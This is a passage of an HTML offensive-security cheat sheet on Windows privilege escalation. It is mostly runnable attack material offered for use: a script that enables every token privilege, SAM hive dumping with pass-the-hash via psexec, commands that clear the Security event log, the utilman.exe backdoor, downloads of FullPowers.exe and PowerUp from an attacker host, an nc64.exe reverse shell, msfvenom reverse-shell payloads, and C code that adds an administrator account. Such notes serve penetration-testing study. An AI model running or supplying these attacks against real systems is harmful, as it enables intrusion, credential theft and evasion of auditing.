              <pre><code class="language-powershell">## All Credit goes to Lee Holmes (@Lee_Holmes on twitter).  I found the code here https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/
$definition = @&#39;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;

namespace Set_TokenPermission
{
    public class SetTokenPriv
    {
        [DllImport(&quot;advapi32.dll&quot;, ExactSpelling = true, SetLastError = true)]
        internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,
        ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
        [DllImport(&quot;advapi32.dll&quot;, ExactSpelling = true, SetLastError = true)]
        internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
        [DllImport(&quot;advapi32.dll&quot;, SetLastError = true)]
        internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        internal struct TokPriv1Luid
        {
            public int Count;
            public long Luid;
            public int Attr;
        }
        internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
        internal const int SE_PRIVILEGE_DISABLED = 0x00000000;
        internal const int TOKEN_QUERY = 0x00000008;
        internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
        public static void EnablePrivilege()
        {
            bool retVal;
            TokPriv1Luid tp;
            IntPtr hproc = new IntPtr();
            hproc = Process.GetCurrentProcess().Handle;
            IntPtr htok = IntPtr.Zero;

            List&lt;string&gt; privs = new List&lt;string&gt;() {  &quot;SeAssignPrimaryTokenPrivilege&quot;, &quot;SeAuditPrivilege&quot;, &quot;SeBackupPrivilege&quot;,
            &quot;SeChangeNotifyPrivilege&quot;, &quot;SeCreateGlobalPrivilege&quot;, &quot;SeCreatePagefilePrivilege&quot;,
            &quot;SeCreatePermanentPrivilege&quot;, &quot;SeCreateSymbolicLinkPrivilege&quot;, &quot;SeCreateTokenPrivilege&quot;,
            &quot;SeDebugPrivilege&quot;, &quot;SeEnableDelegationPrivilege&quot;, &quot;SeImpersonatePrivilege&quot;, &quot;SeIncreaseBasePriorityPrivilege&quot;,
            &quot;SeIncreaseQuotaPrivilege&quot;, &quot;SeIncreaseWorkingSetPrivilege&quot;, &quot;SeLoadDriverPrivilege&quot;,
            &quot;SeLockMemoryPrivilege&quot;, &quot;SeMachineAccountPrivilege&quot;, &quot;SeManageVolumePrivilege&quot;,
            &quot;SeProfileSingleProcessPrivilege&quot;, &quot;SeRelabelPrivilege&quot;, &quot;SeRemoteShutdownPrivilege&quot;,
            &quot;SeRestorePrivilege&quot;, &quot;SeSecurityPrivilege&quot;, &quot;SeShutdownPrivilege&quot;, &quot;SeSyncAgentPrivilege&quot;,
            &quot;SeSystemEnvironmentPrivilege&quot;, &quot;SeSystemProfilePrivilege&quot;, &quot;SeSystemtimePrivilege&quot;,
            &quot;SeTakeOwnershipPrivilege&quot;, &quot;SeTcbPrivilege&quot;, &quot;SeTimeZonePrivilege&quot;, &quot;SeTrustedCredManAccessPrivilege&quot;,
            &quot;SeUndockPrivilege&quot;, &quot;SeUnsolicitedInputPrivilege&quot;, &quot;SeDelegateSessionUserImpersonatePrivilege&quot; };


            

            retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
            tp.Count = 1;
            tp.Luid = 0;
            tp.Attr = SE_PRIVILEGE_ENABLED;

            foreach (var priv in privs)
            {
                retVal = LookupPrivilegeValue(null, priv, ref tp.Luid);
                retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);                              
            }
        }
    }  
}
&#39;@

$type = Add-Type $definition -PassThru
$type[0]::EnablePrivilege() 2&gt;&amp;1
</code></pre>
              <h4 id="743-token-privileges-table">7.4.3 Token Privileges Table</h4>
              <table class="custom-table">
                <thead>
                  <tr>
                    <th>Privilege</th>
                    <th>Impact</th>
                    <th>Tool</th>
                    <th>Execution path</th>
                    <th>Remarks</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td><code>SeAssignPrimaryToken</code></td>
                    <td><em><strong>Admin</strong></em></td>
                    <td>3rd party tool</td>
                    <td><i>&quot;It would allow a user to impersonate tokens and privesc to nt system using tools such
                        as
                        potato.exe, rottenpotato.exe and juicypotato.exe&quot;</i></td>
                    <td>Thank you <a href="https://twitter.com/Defte_">Aur√©lien Chalot</a> for the update. I will try to
                      re-phrase it to something more recipe-like soon.</td>
                  </tr>
                  <tr>
                    <td><code>SeAudit</code></td>
                    <td><strong>Threat</strong></td>
                    <td>3rd party tool</td>
                    <td>Write events to the Security event log to fool auditing or to overwrite old events.</td>
                    <td>Writing own events is possible with <a
                        href="https://learn.microsoft.com/en-us/windows/win32/api/authz/nf-authz-authzreportsecurityevent"><code>Authz Report Security Event</code></a>
                      API.<br> - see <a
                        href="https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeAuditPrivilegePoC">PoC</a>
                      by <a href="https://twitter.com/daem0nc0re">@daem0nc0re</a></td>
                  </tr>
                  <tr>
                    <td><code>SeBackup</code></td>
                    <td><em><strong>Admin</strong></em></td>
                    <td>3rd party tool</td>
                    <td>1. Backup the <code>HKLM\SAM</code> and <code>HKLM\SYSTEM</code> registry hives <br> 2. Extract
                      the local accounts hashes from the <code>SAM</code> database <br> 3. Pass-the-Hash as a member of
                      the local <code>Administrators</code> group <br><br> Alternatively, can be used to read sensitive
                      files.</td>
                    <td>For more information, refer to the <a href="SeBackupPrivilege.html"><code>SeBackupPrivilege</code>
                        file</a>.<br> - see <a
                        href="https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeBackupPrivilegePoC">PoC</a>
                      by <a href="https://twitter.com/daem0nc0re">@daem0nc0re</a></td>
                  </tr>
                  <tr>
                    <td><code>SeBackup</code></td>
                    <td><em><strong>Admin</strong></em></td>
                    <td>3rd party tool <br> <br>Sensitive files access (in combination with <code>SeRestore</code>):
                      <br><em><strong>Built-in commands</strong></em>
                    </td>
                    <td>1. Enable the privilege in the token <br> <br>2. Export
                      the <code>HKLM\SAM</code> and <code>HKLM\SYSTEM</code> registry hives:
                      <br><code>cmd /c &quot;reg save HKLM\SAM SAM &amp; reg save HKLM\SYSTEM SYSTEM&quot;</code> <br>
                      <br>3. Eventually transfer the exported hives on a controlled computer <br> <br>4. Extract the
                      local accounts hashes from the export <code>SAM</code> hive. For example
                      using <code>Impacket</code>&#39;s <code>secretsdump.py</code>Python script:
                      <br><code>secretsdump.py -sam SAM -system SYSTEM LOCAL</code> <br> <br>5. Authenticate as the
                      local built-in <code>Administrator</code>, or another member of the
                      local <code>Administrators</code> group, using its <code>NTLM</code> hash (Pass-the-Hash). For
                      example using <code>Impacket</code>&#39;s <code>psexec.py</code> Python script:
                      <br><code>psexec.py -hashes &quot;:&lt;ADMINISTRATOR_NTLM&gt;&quot; &lt;Administrator&gt;@&lt;TARGET_IP&gt;</code>
                      <br> <br>Alternatively, can be used to read sensitive files with <code>robocopy /b</code>
                    </td>
                    <td>- <code>User Account Control</code> may prevent Pass-the-Hash authentications with the local
                      accounts but by default the built-in <code>Administrator</code> (RID 500) account is not concerned
                      (as <code>FilterAdministratorToken</code> is disabled by default). <br> <br>- Pass-the-Hash
                      authentications can be attempted over (at least) the following services: <code>SMB</code> (port
                      TCP 445), <code>SMB</code> over <code>NetBIOS</code> (port TCP 139), <code>WinRM</code> (ports TCP
                      5985 / 5986), or <code>RDP</code> if the <code>Restricted Admin</code> feature is enabled server
                      side (port TCP 3389). <br> <br>- Access to sensitive files may be more interesting if you can
                      read <code>%WINDIR%\MEMORY.DMP</code>. <br> <br>- <code>SeBackupPrivilege</code> is not helpful
                      when it comes to open and write to files as it may only be used to copy files. <br> <br>-
                      Robocopy requires both <code>SeBackup</code> and <code>SeRestore</code> to work with
                      the <code>/b</code> parameter (which are both granted to members of
                      the <code>Backup Operators</code> group by default). <br>Instead, <a
                        href="https://github.com/giuliano108/SeBackupPrivilege"><code>Copy-FileSeBackupPrivilege</code></a>
                      can
                      be used to backup files through a process with only the <code>SeBackup</code> privilege in its
                      token: <br><code>Import-Module .\SeBackupPrivilegeUtils.dll</code>
                      <br><code>Import-Module .\SeBackupPrivilegeCmdLets.dll</code>
                      <br><code>Set-SeBackupPrivilege</code>
                      <br><code>Copy-FileSeBackupPrivilege &lt;SOURCE_FILE&gt; &lt;DEST_FILE&gt;</code>
                    </td>
                  </tr>
                  <tr>
                    <td><code>SeChangeNotify</code></td>
                    <td>None</td>
                    <td>-</td>
                    <td>-</td>
                    <td>Privilege held by everyone. Revoking it may make the OS (Windows Server 2019) unbootable.</td>
                  </tr>
                  <tr>
                    <td><code>SeCreateGlobal</code></td>
                    <td>?</td>
                    <td>?</td>
                    <td>?</td>
                    <td></td>
                  </tr>
                  <tr>
                    <td><code>SeCreatePagefile</code></td>
                    <td>None</td>
                    <td><em><strong>Built-in commands</strong></em></td>
                    <td>Create hiberfil.sys, read it offline, look for sensitive data.</td>
                    <td>Requires offline access, which leads to admin rights anyway.<br> - See <a
                        href="https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeCreatePagefilePrivilegePoC">PoC</a>
                      by <a href="https://twitter.com/daem0nc0re">@daem0nc0re</a></td>
                  </tr>
                  <tr>
                    <td><code>SeCreatePermanent</code></td>
                    <td>?</td>
                    <td>?</td>
                    <td>?</td>
                    <td></td>
                  </tr>
                  <tr>
                    <td><code>SeCreateSymbolicLink</code></td>
                    <td>?</td>
                    <td>?</td>
                    <td>?</td>
                    <td></td>
                  </tr>
                  <tr>
                    <td><code>SeCreateToken</code></td>
                    <td><em><strong>Admin</strong></em></td>
                    <td>3rd party tool</td>
                    <td>Create arbitrary token including local admin rights with <code>NtCreateToken</code>.<br> - see
                      <a
                        href="https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeCreateTokenPrivilegePoC">PoC</a>
                      by <a href="https://twitter.com/daem0nc0re">@daem0nc0re</a>
                    </td>
                    <td></td>
                  </tr>
                  <tr>
                    <td><code>SeDebug</code></td>
                    <td><em><strong>Admin</strong></em></td>
                    <td><strong>PowerShell</strong></td>
                    <td>Duplicate the <code>lsass.exe</code> token.</td>
                    <td>Script to be found at <a
                        href="https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1">FuzzySecurity</a>.<br>
                      - See <a
                        href="https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC">PoC</a>
                      by <a href="https://twitter.com/daem0nc0re">@daem0nc0re</a></td>
                  </tr>
                  <tr>
                    <td><code>SeDelegateSession-</code><br><code>UserImpersonate</code></td>
                    <td>?</td>
                    <td>?</td>
                    <td>?</td>
                    <td>Privilege name broken to make the column narrow.</td>
                  </tr>
                  <tr>
                    <td><code>SeEnableDelegation</code></td>
                    <td>None</td>
                    <td>-</td>
                    <td>-</td>
                    <td>The privilege is not used in the Windows OS.</td>
                  </tr>
                  <tr>
                    <td><code>SeImpersonate</code></td>
                    <td><em><strong>Admin</strong></em></td>
                    <td>3rd party tool</td>
                    <td>Tools from the <em>Potato family</em> (potato.exe, RottenPotato, RottenPotatoNG, Juicy Potato,
                      SigmaPotato,
                      SweetPotato, RemotePotato0), RogueWinRM, PrintSpoofer.</td>
                    <td>Similarly to <code>SeAssignPrimaryToken</code>, allows by design to create a process under the
                      security context of another user (using a handle to a token of said user). <br><br> Multiple tools
                      and techniques may be used to obtain the required token.</td>
                  </tr>
                  <tr>
                    <td><code>SeIncreaseBasePriority</code></td>
                    <td>Availability</td>
                    <td><em><strong>Built-in commands</strong></em></td>
                    <td><code>start /realtime SomeCpuIntensiveApp.exe</code></td>
                    <td>May be more interesting on servers.</td>
                  </tr>
                  <tr>
                    <td><code>SeIncreaseQuota</code></td>
                    <td>Availability</td>
                    <td>3rd party tool</td>
                    <td>Change cpu, memory, and cache limits to some values making the OS unbootable.</td>
                    <td>- Quotas are not checked in the safe mode, which makes repair relatively easy.<br> - The same
                      privilege is used for managing registry quotas.</td>
                  </tr>
                  <tr>
                    <td><code>SeIncreaseWorkingSet</code></td>
                    <td>None</td>
                    <td>-</td>
                    <td>-</td>
                    <td>Privilege held by everyone. Checked when calling fine-tuning memory management functions.</td>
                  </tr>
                  <tr>
                    <td><code>SeLoadDriver</code></td>
                    <td><em><strong>Admin</strong></em></td>
                    <td>3rd party tool</td>
                    <td>1. Load buggy kernel driver such as <code>szkg64.sys</code><br>2. Exploit the driver
                      vulnerability<br> <br> Alternatively, the privilege may be used to unload security-related drivers
                      with <code>fltMC</code> builtin command. i.e.: <code>fltMC sysmondrv</code></td>
                    <td>1. The <code>szkg64</code> vulnerability is listed as <a
                        href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15732">CVE-2018-15732</a><br>2.
                      The <code>szkg64</code> <a href="https://www.greyhathacker.net/?p=1025">exploit code</a> was
                      created by <a href="https://twitter.com/parvezghh">Parvez Anwar</a></td>
                  </tr>
                  <tr>
                    <td><code>SeLockMemory</code></td>
                    <td>Availability</td>
                    <td>3rd party tool</td>
                    <td>Starve System memory partition by moving pages.</td>
                    <td>PoC published by <a href="https://twitter.com/waleedassar/status/1296689615139676160">Walied
                        Assar (@waleedassar)</a></td>
                  </tr>
                  <tr>
                    <td><code>SeMachineAccount</code></td>
                    <td>None</td>
                    <td>-</td>
                    <td>-</td>
                    <td>The privilege is not used in the Windows OS.</td>
                  </tr>
                  <tr>
                    <td><code>SeManageVolume</code></td>
                    <td><em><strong>Admin</strong></em></td>
                    <td>3rd party tool</td>
                    <td>1. Enable the privilege in the token<br>2. Create handle to \.\C: with
                      <code>SYNCHRONIZE | FILE_TRAVERSE</code><br>3. Send the <code>FSCTL_SD_GLOBAL_CHANGE</code> to
                      replace <code>S-1-5-32-544</code> with <code>S-1-5-32-545</code><br>4. Overwrite utilman.exe etc.
                    </td>
                    <td><code>FSCTL_SD_GLOBAL_CHANGE</code> can be made with this <a
                        href="https://github.com/gtworek/PSBits/blob/master/Misc/FSCTL_SD_GLOBAL_CHANGE.c">piece of
                        code</a>.</td>
                  </tr>
                  <tr>
                    <td><code>SeProfileSingleProcess</code></td>
                    <td>None</td>
                    <td>-</td>
                    <td>-</td>
                    <td>The privilege is checked before changing (and in very limited set of commands, before querying)
                      parameters of Prefetch, SuperFetch, and ReadyBoost. The impact may be adjusted, as the real effect
                      is not known.</td>
                  </tr>
                  <tr>
                    <td><code>SeRelabel</code></td>
                    <td><strong>Threat</strong></td>
                    <td>3rd party tool</td>
                    <td>Modification of system files by a legitimate administrator</td>
                    <td>See: <a
                        href="https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control">MIC
                        documentation</a><br> <br> Integrity labels provide additional protection, on top of well-known
                      ACLs. Two main scenarios include:<br>- protection against attacks using exploitable applications
                      such as browsers, PDF readers etc.<br>- protection of OS files.<br> <br><code>SeRelabel</code>
                      present in the token will allow to use <code>WRITE_OWNER</code> access to a resource, including
                      files and folders. Unfortunately, the token with IL less than <em>High</em> will have SeRelabel
                      privilege disabled, making it useless for anyone not being an admin already.<br> <br>See great <a
                        href="https://www.tiraniddo.dev/2021/06/the-much-misunderstood.html">blog post</a> by <a
                        href="https://twitter.com/tiraniddo">@tiraniddo</a> for details.</td>
                  </tr>
                  <tr>
                    <td><code>SeRemoteShutdown</code></td>
                    <td>Availability</td>
                    <td><em><strong>Built-in commands</strong></em></td>
                    <td><code>shutdown /s /f /m \\server1 /d P:5:19</code></td>
                    <td>The privilege is verified when shutdown/restart request comes from the network. 127.0.0.1
                      scenario to be investigated.</td>
                  </tr>
                  <tr>
                    <td><code>SeReserveProcessor</code></td>
                    <td>None</td>
                    <td>-</td>
                    <td>-</td>
                    <td>It looks like the privilege is no longer used and it appeared only in a couple of versions of
                      winnt.h. You can see it listed i.e. in the source code published by Microsoft <a
                        href="https://code.msdn.microsoft.com/Effective-access-rights-dd5b13a8/sourcecode?fileId=58676&amp;pathId=767997020">here</a>.
                    </td>
                  </tr>
                  <tr>
                    <td><code>SeRestore</code></td>
                    <td><em><strong>Admin</strong></em></td>
                    <td><strong>PowerShell</strong></td>
                    <td>1. Launch PowerShell/ISE with the SeRestore privilege present.<br>2. Enable the privilege with
                      <a
                        href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3.
                      Rename utilman.exe to utilman.old<br>4. Rename cmd.exe to utilman.exe<br>5. Lock the console and
                      press Win+U
                    </td>
                    <td>Attack may be detected by some AV software.<br> <br>Alternative method relies on replacing
                      service binaries stored in &quot;Program Files&quot; using the same privilege.<br> - see <a
                        href="https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeRestorePrivilegePoC">PoC</a>
                      by <a href="https://twitter.com/daem0nc0re">@daem0nc0re</a></td>
                  </tr>
                  <tr>
                    <td><code>SeSecurity</code></td>
                    <td><strong>Threat</strong></td>
                    <td><em><strong>Built-in commands</strong></em></td>
                    <td>- Clear Security event log: <code>wevtutil cl Security</code><br> <br>- Shrink the Security log
                      to 20MB to make events flushed soon: <code>wevtutil sl Security /ms:0</code><br> <br>- Read
                      Security event log to have knowledge about processes, access and actions of other users within the
                      system.<br> <br>- Knowing what is logged to act under the radar.<br> <br>- Knowing what is logged
                      to generate large number of events effectively purging old ones without leaving obvious evidence
                      of cleaning. <br> <br>- Viewing and changing object SACLs (in practice: auditing settings)</td>
                    <td>See <a
                        href="https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeSecurityPrivilegePoC">PoC</a>
                      by <a href="https://twitter.com/daem0nc0re">@daem0nc0re</a></td>
                  </tr>
                  <tr>
                    <td><code>SeShutdown</code></td>
                    <td>Availability</td>
                    <td><em><strong>Built-in commands</strong></em></td>
                    <td><code>shutdown.exe /s /f /t 1</code></td>
                    <td>Allows to call most of NtPowerInformation() levels. To be investigated. Allows to call
                      NtRaiseHardError() causing immediate BSOD and memory dump, leading potentially to sensitive
                      information disclosure - see <a
                        href="https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeShutdownPrivilegePoC">PoC</a>
                      by <a href="https://twitter.com/daem0nc0re">@daem0nc0re</a></td>
                  </tr>
                  <tr>
                    <td><code>SeSyncAgent</code></td>
                    <td>None</td>
                    <td>-</td>
                    <td>-</td>
                    <td>The privilege is not used in the Windows OS.</td>
                  </tr>
                  <tr>
                    <td><code>SeSystemEnvironment</code></td>
                    <td><em>Unknown</em></td>
                    <td>3rd party tool</td>
                    <td>The privilege permits to use <code>NtSetSystemEnvironmentValue</code>,
                      <code>NtModifyDriverEntry</code> and some other syscalls to manipulate UEFI variables.
                    </td>
                    <td>The privilege is required to run sysprep.exe.<p>Additionally:<br>- Firmware environment
                        variables were commonly used on non-Intel platforms in the past, and now slowly return to UEFI
                        world. <br>- The area is highly undocumented.<br>- The potential may be huge (i.e. breaking
                        Secure Boot) but raising the impact level requires at least PoC.<br> - see <a
                          href="https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeSystemEnvironmentPrivilegePoC">PoC</a>
                        by <a href="https://twitter.com/daem0nc0re">@daem0nc0re</a></td>
                  </tr>
                  <tr>
                    <td><code>SeSystemProfile</code></td>
                    <td>?</td>
                    <td>?</td>
                    <td>?</td>
                    <td></td>
                  </tr>
                  <tr>
                    <td><code>SeSystemtime</code></td>
                    <td><strong>Threat</strong></td>
                    <td><em><strong>Built-in commands</strong></em></td>
                    <td><code>cmd.exe /c date 01-01-01</code><br><code>cmd.exe /c time 00:00</code></td>
                    <td>The privilege allows to change the system time, potentially leading to audit trail integrity
                      issues, as events will be stored with wrong date/time.<br>- Be careful with date/time formats. Use
                      always-safe values if not sure.<br>- Sometimes the name of the privilege uses uppercase
                      &quot;T&quot; and is referred as <code>SeSystemTime</code>.</td>
                  </tr>
                  <tr>
                    <td><code>SeTakeOwnership</code></td>
                    <td><em><strong>Admin</strong></em></td>
                    <td><em><strong>Built-in commands</strong></em></td>
                    <td>1. <code>takeown.exe /f &quot;%windir%\system32&quot;</code><br>2.
                      <code>icacls.exe &quot;%windir%\system32&quot; /grant &quot;%username%&quot;:F</code><br>3. Rename
                      cmd.exe to utilman.exe<br>4. Lock the console and press Win+U
                    </td>
                    <td>Attack may be detected by some AV software.<br> <br>Alternative method relies on replacing
                      service binaries stored in &quot;Program Files&quot; using the same privilege.<br> - See <a
                        href="https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeTakeOwnershipPrivilegePoC">PoC</a>
                      by <a href="https://twitter.com/daem0nc0re">@daem0nc0re</a></td>
                  </tr>
                  <tr>
                    <td><code>SeTcb</code></td>
                    <td><em><strong>Admin</strong></em></td>
                    <td>3rd party tool</td>
                    <td>Manipulate tokens to have local admin rights included.</td>
                    <td>Sample code+exe creating arbitrary tokens to be found at <a
                        href="https://github.com/gtworek/PSBits/tree/master/VirtualAccounts">PsBits</a>.</td>
                  </tr>
                  <tr>
                    <td><code>SeTimeZone</code></td>
                    <td>Mess</td>
                    <td><em><strong>Built-in commands</strong></em></td>
                    <td>Change the timezone. <code>tzutil /s &quot;Chatham Islands Standard Time&quot;</code></td>
                    <td></td>
                  </tr>
                  <tr>
                    <td><code>SeTrustedCredManAccess</code></td>
                    <td><strong>Threat</strong></td>
                    <td>3rd party tool</td>
                    <td>Dumping credentials from Credential Manager</td>
                    <td>Great <a href="https://www.tiraniddo.dev/2021/05/dumping-stored-credentials-with.html">blog
                        post</a> by <a href="https://twitter.com/tiraniddo">@tiraniddo</a>.<br> - see <a
                        href="https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeTrustedCredManAccessPrivilegePoC">PoC</a>
                      by <a href="https://twitter.com/daem0nc0re">@daem0nc0re</a></td>
                  </tr>
                  <tr>
                    <td><code>SeUndock</code></td>
                    <td>None</td>
                    <td>-</td>
                    <td>-</td>
                    <td>The privilege is enabled when undocking, but never observed it checked to grant/deny access. In
                      practice it means it is actually unused and cannot lead to any escalation.</td>
                  </tr>
                  <tr>
                    <td><code>SeUnsolicitedInput</code></td>
                    <td>None</td>
                    <td>-</td>
                    <td>-</td>
                    <td>The privilege is not used in the Windows OS.</td>
                  </tr>
                </tbody>
              </table>
              <h4 id="744-fullpowersexe">7.4.4 FullPowers.exe</h4>
              <p>Sometimes we get access to a machine with what seems to be a privilege service account but this account
                has almost non or very little permissions enabled, in this case we can use this tool, <a href="https://github.com/emmasolis1/oscp_tools"
                    download target="_blank"><code>FullPowers.exe</code></a>,
                to <strong>automatically recover the default privilege set of a service account</strong>, including the
                permissions <code>SeAssignPrimaryToken</code> and <code>SeImpersonate</code> which are very popular to
                escalate privileges.</p>
              <ol>
                <li>Start the <strong>Python Server</strong>:</li>
              </ol>
              <pre><code class="language-bash">python3 -m http.server 80
</code></pre>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/fullpowers_1.png" class="img-fluid" alt="Initial Privileges of the Service Account.">
                  <figcaption class="figure-caption text-center">Initial Privileges of the Service Account.</figcaption>
                </figure>
              </div>
              <ol start="2">
                <li><strong>Bring the Executable to the victim</strong>:</li>
              </ol>
              <pre><code class="language-powershell"># CMD
cerutil.exe -urlcache -split -f http://[kali_ip]/FullPowers.exe

# PowerShell
iwr -uri http://[kali_ip]/FullPowers.exe -O FullPowers.exe
</code></pre>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/fullpowers_2.png" class="img-fluid"
                    alt="Downloading FullPowers.exe to victim machine.">
                  <figcaption class="figure-caption text-center">Downloading <code>FullPowers.exe</code> to victim
                    machine.</figcaption>
                </figure>
              </div>
              <ol start="3">
                <li>Run the <strong>Executable</strong>:</li>
              </ol>
              <pre><code class="language-powershell"># Basic Usage
./FullPowers.exe

# Trying to get an extended set of privileges (might fail with NETWORK SERVICE)
./FullPowers.exe -x

# Specify a command line to run
./FullPowers.exe -c &quot;powershell -ep Bypass&quot;

# Start a reverse shell to the attacker machine (requires that you previously bring Netcat to the victim)
./FullPowers.exe -c &quot;C:\Temp\nc64.exe [kali_ip] [port] -e cmd&quot; -z
</code></pre>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/fullpowers_3.png" class="img-fluid" alt="Running FullPowers.exe.">
                  <figcaption class="figure-caption text-center">Running <code>FullPowers.exe</code>.</figcaption>
                </figure>
              </div>
              <ol start="4">
                <li><strong>Verify</strong> that you have now an elevated set of privileges:</li>
              </ol>
              <pre><code class="language-powershell">whoami /priv
</code></pre>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/fullpowers_4.png" class="img-fluid" alt="Verifying our New Restored Privileges.">
                  <figcaption class="figure-caption text-center">Verifying our New Restored Privileges.</figcaption>
                </figure>
              </div>
              <ol start="5">
                <li><strong>Execute your Malicious Actions</strong>: if you have now, for example, the permission
                  <code>SeImpersonate</code> you could use <code>PrintSpoofer.exe</code> or <code>GodPotato.exe</code>
                  to elevate your privileges.
                </li>
                <div class="col-lg text-center" data-aos="fade-up">
                  <figure class="figure">
                    <img src="img/fullpowers_5.png" class="img-fluid" alt="Executing Malicious Actions.">
                    <figcaption class="figure-caption text-center">Executing Malicious Actions.</figcaption>
                  </figure>
                </div>
              </ol>

              <h3 id="75-service-binary-hijacking">7.5 Service Binary Hijacking</h3>
              <h4 id="751-basic-and-main-checks">7.5.1 Basic and Main Checks</h4>
              <p><strong>Check Running Services</strong></p>
              <pre><code class="language-powershell"># Tip: Look for services with paths outside of `system32` or other unexpected locations.; try to find that thing that seems out of place.
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -eq &#39;Running&#39;}
</code></pre>
              <p><strong>Review Permissions of a Service</strong></p>
              <pre><code class="language-powershell">icacls &quot;C:\Path\To\ServiceBinary.exe&quot;
</code></pre>
              <p><strong>Obtain Startup Type of a Service</strong></p>
              <pre><code class="language-powershell">Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -eq &#39;&lt;ServiceName&gt;&#39;}
</code></pre>
              <p><strong>Creating an Executable That Adds a New Administrator User</strong></p>
              <pre><code class="language-c">#include &lt;stdlib.h&gt;

int main ()
{
  system(&quot;net user emma Password123! /add&quot;);
  system(&quot;net localgroup administrators emma /add&quot;);
  return 0;
}
</code></pre>
              <pre><code class="language-bash"># Cross-Compile the C Code to a 64-bit Application
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
</code></pre>
              <p><strong>Creating an Executable that is a Reverse Shell</strong></p>
              <pre><code class="language-bash"># For 64-bit executable
msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;Your_IP&gt; LPORT=&lt;Your_Port&gt; -f exe -o reverse_shell.exe

# For 32-bit executable
msfvenom -p windows/shell_reverse_tcp LHOST=&lt;Your_IP&gt; LPORT=&lt;Your_Port&gt; -f exe -o reverse_shell.exe
</code></pre>
              <p><strong>Replacing the Service Binary with a Malicious Binary</strong>
                It can be a reverse shell generated from <code>msfvenom</code> or for example the program above that
                will add a new user to the system.</p>
              <pre><code class="language-powershell"># Remember to run the HTTP server on your Kali to be able to bring the binary.
iwr -uri http://&lt;attacker-ip&gt;/adduser.exe -Outfile adduser.exe

move &quot;C:\Path\To\ServiceBinary.exe&quot; &quot;C:\Path\To\Backup\ServiceBinary.exe&quot;

move .\adduser.exe &quot;C:\Path\To\ServiceBinary.exe&quot;
</code></pre>
              <p><strong>Restart the Service</strong></p>
              <ul>
                <li>Using PowerShell Function</li>
              </ul>
              <pre><code class="language-powershell">Restart-Service -Name &#39;&lt;ServiceName&gt;&#39;
</code></pre>
              <ul>
                <li>Using <code>sc.exe</code></li>
              </ul>
              <pre><code class="language-powershell">sc.exe stop &lt;ServiceName&gt;
sc.exe start &lt;ServiceName&gt;
</code></pre>
              <p><strong>Restart the System</strong></p>
              <pre><code class="language-powershell"># First check for reboot privileges: SeShutdownPrivilege should be Assigned and Enabled.
whoami /priv

# Perform the restart
shutdown /r /t 0
</code></pre>
              <h4 id="752-additional-optional-checks">7.5.2 Additional Optional Checks</h4>
              <p><strong>Automating the Process with PowerUp</strong></p>
              <ol>
                <li><strong>Start the HTTP server</strong> in our Kali with the script in the folder.</li>
              </ol>
              <pre><code class="language-bash">cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80
</code></pre>
              <ol start="2">
                <li><strong>Bring the script</strong> and run it.</li>
              </ol>
              <pre><code class="language-powershell">iwr -uri http://&lt;attacker-ip&gt;/PowerUp.ps1 -Outfile PowerUp.ps1

powershell -ep bypass
. .\PowerUp.ps1

Get-ModifiableServiceFile

Install-ServiceBinary -Name &#39;&lt;ServiceName&gt;&#39;
</code></pre>
              <ol start="3">
                <li>(<strong>Optional</strong>) Find files and check paths for which our current user can modify.</li>
              </ol>
              <pre><code class="language-powershell">$ModifiableFiles = echo &#39;C:\Path\To\ServiceBinary.exe&#39; | Get-ModifiablePath -Literal
</code></pre>
              <p><strong>Script to find Services with Weak Permissions</strong></p>
              <pre><code class="language-powershell">Get-CimInstance -ClassName win32_service | Select Name, PathName | ForEach-Object {
    $path = $_.PathName -replace &#39;&quot;&#39;, &#39;&#39;
    if (Test-Path $path) {
        icacls $path
    }
}
</code></pre>
              <p><strong>Inspect Service Dependencies</strong>
                Some services use configuration files that can be hijacked similarly to service binaries.</p>
              <pre><code class="language-powershell"># List service dependencies
Get-CimInstance -ClassName win32_service | Select Name, PathName, DependentServices | Where-Object {$_.DependentServices -ne $null}
</code></pre>
              <p><strong>Check for Service Configuration File Hijacking</strong>
                Services often have dependencies that might also be vulnerable. Check dependencies to identify
                additional attack vectors.</p>
